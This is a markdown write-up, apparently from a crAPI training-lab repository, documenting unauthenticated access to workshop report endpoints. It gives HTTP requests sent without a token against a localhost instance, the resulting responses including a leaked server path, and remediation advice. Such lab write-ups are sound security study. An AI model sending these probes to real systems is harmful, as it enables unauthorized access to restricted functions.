[🇧🇷 Português](../../vulnerabilidades/11-unauth-access.md) · 🇺🇸 English

# Unauthenticated access — report endpoints with no token check

**OWASP API Security Top 10 (2023) category:** `API2 — Broken Authentication`
**Severity (CVSS v3.1):** `Medium · 6.5` — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`
**Matching crAPI challenge:** Challenge 14 — "find an endpoint that skips authentication checks"

---

## 1. Summary

Some `workshop` service endpoints (related to the mechanic report) **do not enforce the JWT token check** — in the code, the `@jwt_auth_required` decorator is missing. Anyone, unauthenticated, can trigger them: create a service request (`receive_report`) and reach the report download endpoint (`download_report`), which even leaks the server's absolute path.

## 2. Preconditions

- None. The endpoints respond **without a token**.

## 3. Exploitation walkthrough

1. Call `receive_report` **without** an `Authorization` header:

```http
GET /workshop/api/mechanic/receive_report?mechanic_code=TRAC_JHN&problem_details=test&vin=<VIN> HTTP/1.1
Host: localhost:8888
```

2. Call `download_report` **without** a token:

```http
GET /workshop/api/mechanic/download_report?filename=test HTTP/1.1
Host: localhost:8888
```

3. Compare with a properly protected endpoint (e.g. `GET /workshop/api/shop/products`), which **without** a token returns `401`.

## 4. Evidence

**Confirmed against the local instance** — capture in [`evidencias/11-unauth-access/captura.txt`](../../../evidencias/11-unauth-access/captura.txt).

```
receive_report  (no token) -> HTTP 500  (processes, does NOT return 401; would create a service request with a valid VIN)
download_report (no token) -> HTTP 404  {"message":"File not found at '/app/reports/test'."}
# contrast (protected endpoint):
GET /workshop/api/shop/products (no token) -> HTTP 401  {"message":"JWT Token required!"}
```

While the protected endpoint returns `401`, the report endpoints **execute their logic without requiring authentication**. `download_report` also reveals the internal `/app/reports` path — and it is the entry point for the [Path Traversal](12-path-traversal.md).

## 5. Why it is a risk

Unauthenticated endpoints let anyone create data (pollution/abuse) and reach functions that should be restricted — and they leak information useful for other attacks (here, the filesystem path, which enables the Path Traversal). It is a common mistake: forgetting the authentication check on a route when adding it.

## 6. How to fix

- Require authentication **by default** (deny-by-default) and enforce it on every route that handles data.
- Centralize the check (global middleware/decorator) instead of relying on remembering the decorator in each view.
- Review newly added routes specifically for the presence of the auth check.

## 7. References

- [API2:2023 Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
